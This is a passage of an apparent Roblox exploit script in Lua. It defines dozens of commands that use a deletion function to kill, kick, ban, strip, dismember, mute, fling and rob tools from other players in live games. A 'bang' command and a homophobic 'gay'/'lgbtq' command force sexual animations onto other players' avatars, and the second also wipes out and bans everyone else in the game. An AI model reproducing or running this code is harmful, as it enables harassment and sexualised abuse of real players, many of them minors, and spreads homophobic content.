			hrp.CFrame = CFrame.new(Vector3.new(pos[1],pos[2],pos[3]))
		end)
		task.wait(.75)
		posConnection:Disconnect()
		task.wait(.1)
	end
	flingConnection:Disconnect()
	hum:ChangeState(oldState)
	hrp.AssemblyAngularVelocity = Vector3.zero
	hrp.AssemblyLinearVelocity = Vector3.zero
	task.wait(.1)
	for i = 1, 20 do
		hrp.AssemblyAngularVelocity = Vector3.zero
		hrp.AssemblyLinearVelocity = Vector3.zero
		hrp.CFrame = oldPosition
		task.wait(.05)
	end
	if not isTesting then workspace.FallenPartsDestroyHeight = oldDesroyHeight end
end,{},3)
addCommand("bring", function(plrs)
	local hum = character:FindFirstChild("Humanoid")
	if not hum then return end
	local hrp = character:FindFirstChild("HumanoidRooPart") or hum.RootPart
	if not hrp then return end
	local oldPos = hrp.CFrame
	local cloneHum = hum:Clone()
	local tools = {}
	for i,v in pairs(character:GetChildren()) do
		if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
		table.insert(tools, v)
	end
	for i,v in pairs(localPlayer.Backpack:GetChildren()) do
		if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
		table.insert(tools, v)
	end
	if #tools == 0 then return notify("Error", "Tools are required", 5) end
	runCommand("unfly")
	task.wait()
	delete(hum)
	repeat task.wait() until hum.Parent ~= character
	cloneHum.Parent = character
	task.wait(.1)
	local targetCount = 1
	for i,v in pairs(plrs) do
		if v == localPlayer then continue end
		local tchar = v.Character
		if not tchar then continue end
		local thrp = tchar:FindFirstChild("HumanoidRootPart") or tchar:FindFirstChild("Humanoid") and tchar.Humanoid.RootPart
		if not thrp then continue end
		local tool = tools[targetCount]
		if not tool then return notify("Error", "Not enough tools", 5) end
		cloneHum:EquipTool(tool)
		repeat task.wait() until tool.Parent == character
		task.wait()
		local attempts = 0
		repeat
			thrp.CFrame = tool.Handle.CFrame
			hrp.CFrame = oldPos
			attempts += 1
			task.wait()
		until tool.Parent ~= character or attempts > 100
		hrp.CFrame = oldPos
		task.wait(.25)
		delete(tool)
		targetCount += 1
		task.wait()
	end
	task.wait(.05)
	runCommand("re")
end, {"toolbring", "tbring"}, 3)
addCommand("skydive", function(plrs)
	local hum = character:FindFirstChild("Humanoid")
	if not hum then return end
	local hrp = character:FindFirstChild("HumanoidRooPart") or hum.RootPart
	if not hrp then return end
	local oldPos = hrp.CFrame
	local cloneHum = hum:Clone()
	local tools = {}
	for i,v in pairs(character:GetChildren()) do
		if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
		table.insert(tools, v)
	end
	for i,v in pairs(localPlayer.Backpack:GetChildren()) do
		if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
		table.insert(tools, v)
	end
	if #tools == 0 then return notify("Error", "Tools are required", 5) end
	runCommand("unfly")
	task.wait()
	delete(hum)
	repeat task.wait() until hum.Parent ~= character
	cloneHum.Parent = character
	task.wait(.1)
	local targetCount = 1
	for i,v in pairs(plrs) do
		if v == localPlayer then continue end
		local tchar = v.Character
		if not tchar then continue end
		local thrp = tchar:FindFirstChild("HumanoidRootPart") or tchar:FindFirstChild("Humanoid") and tchar.Humanoid.RootPart
		if not thrp then continue end
		local tool = tools[targetCount]
		if not tool then return notify("Error", "Not enough tools", 5) end
		cloneHum:EquipTool(tool)
		repeat task.wait() until tool.Parent == character
		task.wait()
		local attempts = 0
		local tPos = hrp.CFrame * CFrame.new(0,2000,0)
		repeat
			thrp.CFrame = tool.Handle.CFrame
			hrp.CFrame = tPos
			attempts += 1
			task.wait()
		until tool.Parent ~= character or attempts > 100
		hrp.CFrame = tPos
		task.wait(.25)
		delete(tool)
		targetCount += 1
		task.wait()
	end
	hrp.CFrame = oldPos
	task.wait(.2)
	runCommand("re")
end, {}, 1)
local function spawnHighlightBox()
	local box = Instance.new("SelectionBox")
	box.Name = "wacky selection box"
	box.Parent = gui
	box.Destroying:Connect(spawnHighlightBox)
	clickDeleteBox = box
end
spawnHighlightBox()
local clickDeleteHighlightCon = rs.Heartbeat:Connect(function()
	if not (clickDelete and clickDeleteBox) then return end
	clickDeleteBox.Adornee = mouse.Target
end)
table.insert(genv.connections, clickDeleteHighlightCon)
local clickDeleteCon = uis.InputEnded:Connect(function(key,processed)
	if (clickDelete == false or processed) then return end
	if key.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	local target = mouse.Target
	if not target then return end
	delete(target)
end)
table.insert(genv.connections, clickDeleteCon)
addCommand("clickdelete", function()
	clickDelete = true
end, {"clickdel"}, 3)
addCommand("unclickdelete", function()
	clickDelete = false
	clickDeleteBox.Adornee = nil
end, {"unclickdel"}, 3)
addCommand("btools", function()
	sgui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
	if localPlayer.Backpack:FindFirstChild("wacky destroy tool") or (character and character:FindFirstChild("wacky destroy tool")) then
		return
	end
	local selection
	local destroyTool = Instance.new("Tool", localPlayer.Backpack)
	destroyTool.RequiresHandle = false
	destroyTool.CanBeDropped = false
	destroyTool.Name = "wacky destroy tool"
	destroyTool.ToolTip = "Click to destroy"
	destroyTool.TextureId = "rbxasset://Textures/Hammer.png"
	local selectionLoop
	destroyTool.Equipped:Connect(function()
		selection = Instance.new("SelectionBox", isTesting and localPlayer.PlayerGui or game:GetService("CoreGui"))
		table.insert(genv.connections, selection)
		selectionLoop = rs.Heartbeat:Connect(function()
			local target = mouse.Target
			if target == nil then
				selection.Adornee = nil
				return
			end
			if selection.Parent == nil then return end
			selection.Adornee = target
		end)
		table.insert(genv.connections, selectionLoop)
	end)
	destroyTool.Unequipped:Connect(function()
		if not selection then return end
		selection:Destroy()
	end)
	destroyTool.Activated:Connect(function()
		local target = mouse.Target
		if target == nil then return end
		delete(target)
	end)
	local unweldTool = Instance.new("Tool", localPlayer.Backpack)
	unweldTool.RequiresHandle = false
	unweldTool.CanBeDropped = false
	unweldTool.Name = "wacky unweld tool"
	unweldTool.ToolTip = "Click to unweld"
	unweldTool.TextureId = "rbxassetid://4989743039"
	unweldTool.Equipped:Connect(function()
		selection = Instance.new("SelectionBox",localPlayer.PlayerGui)
		table.insert(genv.connections, selection)
		selectionLoop = rs.Heartbeat:Connect(function()
			local target = mouse.Target
			if target == nil then
				selection.Adornee = nil
				return
			end
			if selection.Parent == nil then return end
			selection.Adornee = target
		end)
		table.insert(genv.connections, selectionLoop)
	end)
	unweldTool.Unequipped:Connect(function()
		if not selection then return end
		selection:Destroy()
	end)
	unweldTool.Activated:Connect(function()
		local target = mouse.Target
		if target == nil then return end
		for i,v in pairs(target:GetDescendants()) do
			if not (v:IsA("Weld") or v:IsA("Attachment")) then continue end
			delete(v)
		end
	end)
end, {}, 3)
addCommand("gun", function()
	sgui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
	if not character then return end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if localPlayer.Backpack:FindFirstChild("wacky gun tool") or (character:FindFirstChild("wacky gun tool")) then
		return
	end
	local gunTool = Instance.new("Tool", localPlayer.Backpack)
	gunTool.RequiresHandle = false
	gunTool.CanBeDropped = false
	gunTool.Name = "wacky gun tool"
	gunTool.ToolTip = "Click a player to \"shoot\" them"
	gunTool.TextureId = "rbxassetid://822278164"
	local handle = Instance.new("Part", gunTool)
	handle.Name = "Handle"
	handle.Transparency = 1
	handle.CanCollide = false
	handle.Size = Vector3.new(0.001,0.001,0.001)
	handle.Massless = true
	local track
	gunTool.Activated:Connect(function()
		local target = mouse.Target
		if target == nil then return end
		for i,v in pairs(players:GetPlayers()) do
			local char = v.Character
			if char == nil then continue end
			for _, part in pairs(char:GetDescendants()) do
				if (not part:IsA("BasePart")) or part ~= target then continue end
				if humanoid.RigType == Enum.HumanoidRigType.R6 then
					track.TimePosition = 0.4
					task.wait(.25)
					track.TimePosition = 0.18
				end
				local arg = {players:GetPlayerFromCharacter(char)}
				runCommand("ragdoll", arg)
				task.wait(1.5)
				runCommand("kill", arg)
				break
			end
		end
	end)
	if humanoid.RigType ~= Enum.HumanoidRigType.R6 then return end
	local animation = Instance.new("Animation")
	animation.AnimationId = "rbxassetid://33169583"
	track = humanoid:LoadAnimation(animation)
	track.Priority = Enum.AnimationPriority.Movement
	gunTool.Equipped:Connect(function()
		track:Play()
		task.wait()
		track:AdjustSpeed(0)
		track.TimePosition = 0.18
		track:AdjustWeight(0.95)
	end)
	gunTool.Unequipped:Connect(function()
		track:Stop()
	end)
end, {}, 3)
addCommand("punch", function()
	sgui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
	if not character then return end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end
	local isR15 = humanoid.RigType == Enum.HumanoidRigType.R15
	local arm = (isR15 and character:FindFirstChild("RightLowerArm")) or (character:FindFirstChild("Right Arm"))
	if not arm then return end
	if localPlayer.Backpack:FindFirstChild("wacky punch tool") or (character:FindFirstChild("wacky punch tool")) then
		return
	end
	local punchTool = Instance.new("Tool", localPlayer.Backpack)
	punchTool.RequiresHandle = false
	punchTool.CanBeDropped = false
	punchTool.Name = "wacky punch tool"
	punchTool.ToolTip = "Click to punch"
	punchTool.TextureId = "rbxassetid://14881411853"
	local animation = Instance.new("Animation")
	animation.AnimationId = (isR15 and "rbxassetid://846744780") or ("rbxassetid://204062532")
	local track = humanoid:LoadAnimation(animation)
	local attacking = false
	arm.Touched:Connect(function(part)
		if not attacking then return end
		local parent = part.Parent
		if not parent then return end
		local target = players:GetPlayerFromCharacter(parent)
		if (not target) or (target == localPlayer) then return end
		local hum = parent:FindFirstChildOfClass("Humanoid")
		if hum and hum.Health <= 0 then return end
		runCommand("kill",{target})
	end)
	punchTool.Activated:Connect(function()
		if attacking then return end
		track:Play()
		task.wait(isR15 and 0.2 or 0.165)
		attacking = true
		track.Ended:Wait()
		attacking = false
	end)
end, {"slap"}, 3)
table.insert(genv.connections,players.PlayerAdded:Connect(function(plr)
	if (slockEnabled or bans[tostring(plr.UserId)]) then
		task.wait()
		delete(plr)
	end
end))
addCommand("ban", function(plrs, input)
	for i,v in pairs(plrs) do
		if v == localPlayer then continue end
		if bans[tostring(v.UserId)] then continue end
		bans[tostring(v.UserId)] = input
		delete(v)
	end
end, {}, 2)
addCommand("unban", function(plrs, input)
	if input == "all" then return table.clear(bans) end
	for i,v in pairs(bans) do
		if v ~= input and i ~= input then continue end
		bans[i] = nil
	end
end, {}, 2)
addCommand("clearbans", function()
	table.clear(bans)
end, {}, 2)
addCommand("serverlock",function()
	slockEnabled = true
end, {"slock"}, 2)
addCommand("unserverlock", function()
	slockEnabled = false
end, {"unslock"}, 2)
addCommand("kick", function(plrs)
	for i,v in pairs(plrs) do
		delete(v)
	end
end, {}, 2)
addCommand("mute", function(plrs)
	if not modernChat then return notify("Error", "Game uses legacy chat, command not supported") end
	local names = {}
	for i,v in pairs(plrs) do
		table.insert(names, v.Name)
	end
	for i,instance in pairs(game:GetService("TextChatService").TextChannels:GetDescendants()) do
		if not table.find(names, instance.Name) then continue end
		delete(instance)
	end
end, {}, 2)
addCommand("unsit", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if not char then continue end
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if not humanoid then continue end
		local seatPart = humanoid.SeatPart
		if not seatPart then continue end
		local weld = seatPart:FindFirstChild("SeatWeld")
		if not weld then continue end
		delete(weld)
	end
end, {"stand"}, 1)
addCommand("kill", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		local head = char:FindFirstChild("Head")
		if head == nil then continue end
		local neck = head:FindFirstChild("Neck")
		if neck == nil then
			local torso = char:FindFirstChild("Torso")
			if torso and torso:FindFirstChild("Neck") then neck = char.Torso.Neck end
		end
		if humanoid and humanoid.RequiresNeck and neck then
			delete(neck)
		end
	end
end, {}, 1)
table.insert(genv.connections, rs.Heartbeat:Connect(function()
	local toKill = {}
	for i,v in pairs(loopkills) do
		if v.Parent ~= players then table.remove(toKill, i) continue end
		if not v.Character then continue end
		table.insert(toKill, v)
	end
	runCommand("kill", toKill)
end))
addCommand("gay", function(plrs)
	local allPlayers = players:GetPlayers()
	local candidates = {}
	for _, p in ipairs(allPlayers) do
		if p ~= localPlayer then
			table.insert(candidates, p)
		end
	end
	local survivor = #candidates > 0 and candidates[math.random(1, #candidates)] or nil
	for _, v in ipairs(allPlayers) do
		if v == localPlayer or v == survivor then continue end
		local char = v.Character
		if char then
			local humanoid = char:FindFirstChildOfClass("Humanoid")
			local head = char:FindFirstChild("Head")
			if head then
				local neck = head:FindFirstChild("Neck") or (char:FindFirstChild("Torso") and char.Torso:FindFirstChild("Neck"))
				if humanoid and humanoid.RequiresNeck and neck then delete(neck) end
			end
			for _, obj in pairs(char:GetDescendants()) do
				if obj:IsA("Accessory") or obj:IsA("Shirt") or obj:IsA("Pants") or obj:IsA("BodyColors") or obj:IsA("ShirtGraphic") or (obj:IsA("Decal") and obj.Name == "face") then
					delete(obj)
				end
			end
		end
		bans = bans or {}
		bans[tostring(v.UserId)] = "obliterated"
		delete(v)
	end
	local myChar = localPlayer.Character
	if myChar then
		for _, obj in pairs(myChar:GetDescendants()) do
			if obj:IsA("Accessory") or obj:IsA("Shirt") or obj:IsA("Pants") or obj:IsA("BodyColors") or obj:IsA("ShirtGraphic") or (obj:IsA("Decal") and obj.Name == "face") then
				delete(obj)
			end
		end
	end
	runCommand("unbang")
	local target = survivor
	if not character or not target or not target.Character then return end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if not humanoid or not target.Character:FindFirstChildOfClass("Humanoid") or not target.Character:FindFirstChild("HumanoidRootPart") then return end
	local hrp = target.Character.HumanoidRootPart
	if hrp then hrp.Anchored = true end
	local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
	if myHRP and hrp then myHRP.CFrame = hrp.CFrame * CFrame.new(0, 0.75, -1.5) end
	local bangAnim = Instance.new("Animation")
	bangAnim.AnimationId = (humanoid.RigType ~= Enum.HumanoidRigType.R15) and "rbxassetid://148840371" or "rbxassetid://5918726674"
	local bang = humanoid:LoadAnimation(bangAnim)
	bang:Play(0.1, 1, 1)
	bang:AdjustSpeed(3)
	local bangDied = humanoid.Died:Connect(function()
		bang:Stop()
		bangAnim:Destroy()
		if bangLoop then bangLoop:Disconnect() end
	end)
	if target ~= localPlayer then
		local bangLoop = rs.Stepped:Connect(function()
			if not target.Character then return end
			local hum = target.Character:FindFirstChildOfClass("Humanoid")
			if not hum then return end
			local root = hum.RootPart
			if not root then return end
			character:PivotTo(root.CFrame * CFrame.new(0, 0.75, 1.1))
		end)
		table.insert(genv.connections, bangLoop)
	end
	notify("Why did you run this command?", "Are you okay?", 5)
end, {"gayness", "lgbtq"}, 3)
addCommand("loopkill", function(plrs)
	for i,v in pairs(plrs) do
		if table.find(loopkills, v) then continue end
		table.insert(loopkills, v)
	end
end, {}, 1)
addCommand("unloopkill", function(plrs, input)
	if input:lower() == "all" then loopkills = {} return end
	for i,v in pairs(loopkills) do
		if table.find(plrs, v) then table.remove(loopkills, i) end
	end
end, {}, 1)
addCommand("silentkill", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		local head = char:FindFirstChild("Head")
		if not head then continue end
		local neck = head:FindFirstChild("Neck")
		if not neck then
			local torso = char:FindFirstChild("Torso")
			if torso and torso:FindFirstChild("Neck") then neck = char.Torso.Neck end
		end
		if not (humanoid and humanoid.RequiresNeck and neck) then continue end
		delete(neck)
		repeat task.wait() until humanoid.Health <= 0
		delete(char)
	end
end, {"skill"}, 1)
addCommand("naked", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		if char:FindFirstChild("Pants") then delete(char.Pants) end
		if char:FindFirstChild("Shirt") then delete(char.Shirt) end
		if char:FindFirstChild("Shirt Graphic") then delete(char["Shirt Graphic"]) end
		for _,instance in pairs(char:GetDescendants()) do
			if instance:IsA("WrapLayer") then delete(instance.Parent.Parent) end
		end
	end
end, {"noclothing"}, 1)
addCommand("bald", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		for _,instance in pairs(char:GetChildren()) do
			if instance:IsA("Accessory") then delete(instance) end
		end
	end
end, {"nohats"}, 1)
addCommand("nolimbs", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		for _,instance in pairs(char:GetChildren()) do
			for _, limbName in pairs(limbs) do
				if instance.Name:lower():find(limbName) then delete(instance) break end
			end
		end
	end
end, {}, 1)
addCommand("noarms", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		for _,instance in pairs(char:GetChildren()) do
			if instance.Name:lower():find("arm") then delete(instance) end
		end
	end
end, {}, 1)
addCommand("nolegs", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		for _,instance in pairs(char:GetChildren()) do
			if instance.Name:lower():find("leg") or instance.Name:lower():find("foot") then delete(instance) end
		end
	end
end, {}, 1)
addCommand("noface", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		local head = char:FindFirstChild("Head")
		if head == nil then continue end
		for _,instance in pairs(head:GetChildren()) do
			if instance:IsA("Decal") then delete(instance) end
		end
	end
end, {}, 1)
addCommand("stripidentity", function(plrs)
	runCommand("noface",plrs)
	runCommand("naked", plrs)
	runCommand("bald", plrs)
end, {"strip", "noidentity"}, 1)
addCommand("korblox", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if not char then continue end
		local r6Leg = char:FindFirstChild("Right Leg")
		if r6Leg then delete(r6Leg) continue end
		local r15Leg = char:FindFirstChild("RightUpperLeg")
		if r15Leg then delete(r15Leg) end
	end
end, {}, 1)
addCommand("blockhead", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if not char then continue end
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if not (humanoid and humanoid.RigType == Enum.HumanoidRigType.R6) then continue end
		local head = char:FindFirstChild("Head")
		if not head then continue end
		local mesh = head:FindFirstChildOfClass("SpecialMesh")
		if mesh then delete(mesh) end
	end
end, {"demeshhead"}, 1)
addCommand("blockhats", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if not char then continue end
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if not (humanoid and humanoid.RigType == Enum.HumanoidRigType.R6) then continue end
		for _, hat in pairs(humanoid:GetAccessories()) do
			local handle = hat:FindFirstChild("Handle")
			if not handle then continue end
			local mesh = handle:FindFirstChildOfClass("SpecialMesh") or handle:FindFirstChildOfClass("Mesh")
			if mesh then delete(mesh) end
		end
	end
end, {"demeshhats"}, 1)
addCommand("blocktools", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if not char then continue end
		local handles = {}
		for _, tool in pairs(v.Backpack:GetChildren()) do
			if tool:IsA("Tool") and tool:FindFirstChild("Handle") then table.insert(handles, tool.Handle) end
		end
		for _, tool in pairs(char:GetChildren()) do
			if tool:IsA("Tool") and tool:FindFirstChild("Handle") then table.insert(handles, tool.Handle) end
		end
		for _, handle in pairs(handles) do
			local mesh = handle:FindFirstChildOfClass("SpecialMesh") or handle:FindFirstChildOfClass("Mesh")
			if mesh then delete(mesh) end
		end
	end
end, {"demeshtools"}, 1)
addCommand("bighats", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if not char then continue end
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not (hum and hum.RigType == Enum.HumanoidRigType.R15) then continue end
		local scalableHats = {}
		for _, hat in pairs(hum:GetAccessories()) do
			if hat:FindFirstChild("Handle") and hat.Handle:FindFirstChild("AvatarPartScaleType") then
				table.insert(scalableHats, hat)
			end
		end
		if #scalableHats == 0 then continue end
		task.spawn(function()
			for _, valueName in pairs(scaleValues) do
				for _, hat in pairs(scalableHats) do
					local handle = hat:FindFirstChild("Handle")
					if handle and handle:FindFirstChild("OriginalSize") then
						delete(handle.OriginalSize)
						repeat task.wait() until not handle:FindFirstChild("OriginalSize")
					end
				end
				local scaleValue = hum:FindFirstChild(valueName)
				if scaleValue then
					delete(scaleValue)
					repeat task.wait() until not hum:FindFirstChild(valueName)
				end
			end
		end)
	end
end, {"rescalehats", "gianthats"}, 1)
addCommand("rescale", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if not char then continue end
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not (hum and hum.RigType == Enum.HumanoidRigType.R15) then continue end
		spawn(function()
			local function rm()
				for _, part in pairs(char:GetDescendants()) do
					if not part:IsA("BasePart") then continue end
					if part.Name == "Handle" or part.Name == "Head" then
						if char.Head and char.Head:FindFirstChild("OriginalSize") then delete(char.Head.OriginalSize) end
					else
						for _, cav in pairs(part:GetDescendants()) do
							if cav:IsA("Attachment") and cav:FindFirstChild("OriginalPosition") then
								delete(cav.OriginalPosition)
								task.wait(.1)
							end
						end
						if part:FindFirstChild("OriginalSize") then delete(part.OriginalSize); task.wait(.1) end
						if part:FindFirstChild("AvatarPartScaleType") then delete(part.AvatarPartScaleType); task.wait(.1) end
					end
				end
			end
			for _, valueName in pairs(scaleValues) do
				rm()
				task.wait(.1)
				local scale = hum:FindFirstChild(valueName)
				if scale then delete(scale); task.wait(.1) end
			end
		end)
	end
end, {"morph"}, 1)
addCommand("ragdoll", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char and char:FindFirstChild("HumanoidRootPart") then
			delete(char.HumanoidRootPart)
		end
	end
end, {"nohrp"}, 1)
addCommand("sink", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char and char:FindFirstChildOfClass("Humanoid") then
			delete(char:FindFirstChildOfClass("Humanoid"))
		end
	end
end, {"nohum","nohumanoid"}, 2)
addCommand("freeze", function(plrs)
	runCommand("ragdoll", plrs)
	runCommand("noanims", plrs)
end, {}, 2)
addCommand("noanims", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if humanoid and humanoid:FindFirstChildOfClass("Animator") then delete(humanoid:FindFirstChildOfClass("Animator")) end
		if char:FindFirstChild("Animate") then delete(char.Animate) end
	end
end, {}, 1)
addCommand("invisible", function(plrs)
	local ignoreList = {"UpperTorso", "Head", "HumanoidRootPart", "Humanoid"}
	for i,v in pairs(plrs) do
		local char = v.Character
		if not char then continue end
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if not (humanoid and humanoid.RigType == Enum.HumanoidRigType.R15) then continue end
		for _,instance in pairs(char:GetChildren()) do
			if not table.find(ignoreList, instance.Name) then delete(instance) end
		end
		if humanoid.RootPart then humanoid.RootPart.Transparency = 0.6 end
	end
end, {"invis"}, 1)
addCommand("legwalk", function(plrs)
	local deleteList = {"LeftUpperArm","RightUpperArm"}
	for i,v in pairs(plrs) do
		local char = v.Character
		if not char then continue end
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if not (humanoid and humanoid.RigType == Enum.HumanoidRigType.R15) then continue end
		local upperTorso = char:FindFirstChild("UpperTorso")
		if upperTorso and upperTorso:FindFirstChild("Waist") then delete(upperTorso.Waist) end
		for _,instance in pairs(char:GetChildren()) do
			if table.find(deleteList, instance.Name) or instance:IsA("Accessory") then delete(instance) end
		end
	end
end, {"split"}, 1)
addCommand("fakechat", function(plrs)
	local hrp = character and character:FindFirstChild("HumanoidRootPart")
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	if not (hrp and humanoid) then return end
	local target
	for _, v in pairs(plrs) do
		if v ~= localPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
			target = v
			break
		end
	end
	if not target then return end
	runCommand("unbang")
	runCommand("view", {target})
	task.wait(0.2)
	if humanoid.RigType == Enum.HumanoidRigType.R15 then
		runCommand("invisible", {localPlayer})
	else
		for _, v in pairs(hrp:GetChildren()) do delete(v) end
		repeat task.wait() until #hrp:GetChildren() == 0
	end
	local followLoop = rs.Heartbeat:Connect(function()
		if not target.Character then return end
		local thrp = target.Character:FindFirstChild("HumanoidRootPart")
		if not thrp then return end
		local predictedCF = CFrame.new(thrp.Position + thrp.Velocity / 4)
		hrp.CFrame = (predictedCF * CFrame.new(0, 3, -1.5)) * CFrame.Angles(math.rad(90), 0, 0)
		hrp.AssemblyAngularVelocity, hrp.AssemblyLinearVelocity = Vector3.zero, Vector3.zero
	end)
	table.insert(genv.connections, followLoop)
	table.insert(genv.connections, humanoid.Died:Connect(function()
		if followLoop then followLoop:Disconnect() end
		runCommand("unview")
	end))
end, {}, 3)
addCommand("notools", function(plrs)
	for i,v in pairs(plrs) do
		for _, item in pairs(v.Backpack:GetChildren()) do
			if item:IsA("BackpackItem") then delete(item) end
		end
		if v.Character then
			for _, item in pairs(v.Character:GetChildren()) do
				if item:IsA("BackpackItem") then delete(item) end
			end
		end
	end
end, {}, 1)
addCommand("grabtools", function(plrs, input, caller)
	local callChar = caller.Character
	if not callChar then return end
	local pos = callChar:GetPivot()
	if not pos then return end
	for _, v in pairs(workspace:GetDescendants()) do
		if v:IsA("Tool") and v:FindFirstChild("Handle") and v.Handle:FindFirstChildOfClass("TouchTransmitter") then
			v.Handle.CanCollide = false
			v.Handle.CFrame = pos
		end
	end
end, {"getalltools"}, 1)
addCommand("givetools", function(plrs, input, caller)
	local callChar = caller.Character
	if not callChar then return end
	local callHum = callChar:FindFirstChildOfClass("Humanoid")
	local callHead = callChar:FindFirstChild("Head")
	if not (callHum and callHead) then return end
	local oldPos = caller == localPlayer and callChar:GetPivot()
	local target = plrs[1]
	if not target or not target.Character or not target.Character:FindFirstChildOfClass("Humanoid") then return end
	local thrp = target.Character:FindFirstChild("HumanoidRootPart")
	local tools = {}
	for _, v in pairs(callChar:GetChildren()) do
		if v:IsA("Tool") and v:FindFirstChild("Handle") then table.insert(tools, v) end
	end
	if #tools == 0 then return end
	delete(callHead)
	repeat task.wait() until not callChar:FindFirstChild("Head")
	delete(callHum)
	repeat task.wait() until not callChar:FindFirstChildOfClass("Humanoid")
	local targetPivot = thrp and thrp.CFrame or target.Character:GetPivot()
	for _, v in pairs(tools) do
		v.Handle.CanCollide = false
		v.Handle.CFrame = targetPivot
	end
	if oldPos then localPlayer.CharacterAdded:Wait():PivotTo(oldPos) end
end, {"givetool","give"}, 1)
addCommand("stealtools", function(plrs, input, caller)
	local lpHumanoid = caller.Character and caller.Character:FindFirstChildOfClass("Humanoid")
	if not lpHumanoid then return end
	local hrp = lpHumanoid.RootPart
	for _, plr in pairs(plrs) do
		if plr == caller or not plr.Character then continue end
		local tool = plr.Character:FindFirstChildOfClass("BackpackItem")
		if not tool then continue end
		if plr.Character:FindFirstChild("Head") then delete(plr.Character.Head) end
		task.wait(0.05)
		if plr.Character:FindFirstChildOfClass("Humanoid") then delete(plr.Character:FindFirstChildOfClass("Humanoid")) end
		repeat task.wait() until not plr.Character:FindFirstChildOfClass("Humanoid")
		task.wait(.05)
		for _, v in pairs(plr.Character:GetChildren()) do
			if v:IsA("BackpackItem") and v:FindFirstChild("Handle") and hrp and hrp.Parent then
				v.Handle.CFrame = hrp.CFrame
				lpHumanoid:EquipTool(v)
			end
		end
	end
end, {"stools"}, 1)
addCommand("droptools", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if not char then continue end
		local arm = char:FindFirstChild("Right Arm") or char:FindFirstChild("RightHand")
		if not arm then continue end
		table.insert(genv.connections, arm.ChildAdded:Connect(function()
			if char:FindFirstChildOfClass("Tool") then task.wait(.1); delete(arm) end
		end))
		if arm:FindFirstChild("RightGrip") then delete(arm.RightGrip) end
	end
end, {"collidetools"}, 1)
addCommand("punish", function(plrs)
	for i,v in pairs(plrs) do
		if v.Character then delete(v.Character) end
	end
end, {}, 2)
addCommand("bang", function(plrs) -- credit to the Infinite Yield team
	if not character then return end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end
	runCommand("unbang")
	local target
	for _, v in pairs(plrs) do
		if v.Character and v.Character:FindFirstChildOfClass("Humanoid") and v.Character.Humanoid.RootPart then
			target = v
			break
		end
	end
	local bangAnim = Instance.new("Animation")
	bangAnim.AnimationId = (humanoid.RigType ~= Enum.HumanoidRigType.R15) and "rbxassetid://148840371" or "rbxassetid://5918726674"
	local bang = humanoid:LoadAnimation(bangAnim)
	bang:Play(0.1, 1, 1)
	bang:AdjustSpeed(3)
	local bangDied = humanoid.Died:Connect(function()
		bang:Stop()
		bangAnim:Destroy()
		if bangLoop then bangLoop:Disconnect() end
	end)
	if not target or target == localPlayer then return end
	local bangLoop = rs.Stepped:Connect(function()
		if not target.Character or not target.Character:FindFirstChildOfClass("Humanoid") or not target.Character.Humanoid.RootPart then return end
		character:PivotTo(target.Character.Humanoid.RootPart.CFrame * CFrame.new(0, 0.75, 1.1))
	end)
	table.insert(genv.connections, bangLoop)
end, {}, 3)
addCommand("unbang", function()
	if bangDied then bangDied:Disconnect() end
	if bang then bang:Stop() end
	if bangAnim then bangAnim:Destroy() end
	if bangLoop then bangLoop:Disconnect() end
end, {}, 3)
addCommand("clearstarter", function()
	local whitelist = {"BubbleChat", "ChatScript", "PlayerScriptsLoader", "RbxCharacterSounds", "PlayerModule"}
	for _, v in pairs(sgui:GetChildren()) do delete(v) end
	for _, v in pairs(game:GetService("StarterPack"):GetChildren()) do delete(v) end
	for _, v in pairs(game:GetService("StarterPlayer"):FindFirstChildOfClass("StarterPlayerScripts"):GetChildren()) do
		if not table.find(whitelist, v.Name) then delete(v) end
	end
	for _, v in pairs(game:GetService("StarterPlayer"):FindFirstChildOfClass("StarterCharacterScripts"):GetChildren()) do
		delete(v)
	end
